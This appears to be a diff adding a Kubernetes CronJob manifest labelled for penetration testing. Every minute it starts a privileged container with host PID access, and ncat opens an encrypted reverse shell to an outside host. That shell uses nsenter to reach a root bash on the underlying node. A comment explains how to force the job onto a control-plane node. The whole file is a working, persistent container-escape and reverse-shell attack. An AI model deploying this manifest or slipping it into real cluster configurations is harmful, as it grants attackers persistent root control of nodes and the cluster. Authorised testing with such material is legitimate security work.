@@ -1,0 +1,23 @@
+apiVersion: batch/v1beta1
+kind: CronJob
+metadata:
+  name: priv-and-hostpid-revshell-cronjob
+  labels:
+    app: pentest
+spec:
+  schedule: "*/1 * * * *"
+  concurrencyPolicy: Forbid
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          hostPID: true
+          containers:
+          - name: priv-and-hostpid-revshell-cronjob
+            image: raesene/ncat
+            securityContext:
+              privileged: true
+            command: [ "/usr/local/bin/ncat", "--ssl", "$HOST", "$PORT", "-e", "/bin/nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
+          #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+          restartPolicy: OnFailure
+
